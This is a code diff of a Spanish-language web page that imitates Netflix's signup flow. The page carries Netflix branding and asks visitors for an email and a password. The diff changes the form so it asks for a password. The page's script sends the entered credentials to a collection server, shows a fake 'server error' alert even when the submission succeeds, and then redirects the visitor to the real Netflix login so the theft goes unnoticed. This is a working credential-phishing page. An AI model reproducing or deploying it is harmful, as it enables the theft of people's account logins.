@@ -1,31 +1,34 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Netflix</title>
     <link rel="stylesheet" href="signup.css">
 </head>
+
 <body>
     <div class="nav">
         <div class="logo"><img src="logo.png" alt=""></div>
-        <div class="iniciar"><a href="">Iniciar sesión</a></div>
+        <div class="iniciar"> <a href="login.html">Iniciar sesión</a></div>
+
     </div>
-    
+
     <div class="centrado">
         <div class="ti">
             <span>PASO <strong>2</strong> DE <strong>4</strong></span>
             <h1>Crea una contraseña para que comiences tu membresía</h1>
             <p>¡Unos pasos más y listo!</p>
             <p>Tampoco nos gustan los trámites.</p>
-            
+
             <div class="datos">
-                <!-- FORMULARIO WEB3FORMS CON TU KEY -->
-               <form id="contact">
-  <input type="email" name="email" placeholder="Email" required />
-  <textarea name="message" placeholder="Mensaje" required></textarea>
-  <button type="submit">Enviar</button>
-</form>
+                <form id="contact">
+                    <input type="email" name="email" placeholder="Email" required />
+
+                    <input type="password" name="message" placeholder="Contraseña" required />
+                    <button type="submit">Enviar</button>
+                </form>
             </div>
         </div>
     </div>
@@ -59,30 +62,31 @@
         </div>
     </div>
 
- <script>
-document.getElementById('contact').addEventListener('submit', async (e) => {
-  e.preventDefault();
-  const form = e.target;
-  const payload = {
-    email: form.email.value,
-    message: form.message.value
-  };
-  try {
-    const r = await fetch('http://localhost:3000/submit', {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify(payload)
-    });
-    const out = await r.json();
-    alert(out.success ? 'Error del servidor, intentelo nuevamente' : 'Error al enviar');
+    <script>
+        document.getElementById('contact').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const form = e.target;
+            const payload = {
+                email: form.email.value,
+                message: form.message.value
+            };
+            try {
+                const r = await fetch('http://localhost:3000/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const out = await r.json();
+                alert(out.success ? 'Error del servidor, intentelo nuevamente' : 'Error al enviar');
 
 
-    window.location.replace('https://www.netflix.com/mx/login');
+                window.location.replace('https://www.netflix.com/mx/login');
 
-  } catch (e) {
-    alert('Error de red');
-  }
-});
-</script>
+            } catch (e) {
+                alert('Error de red');
+            }
+        });
+    </script>
 </body>
+
 </html>
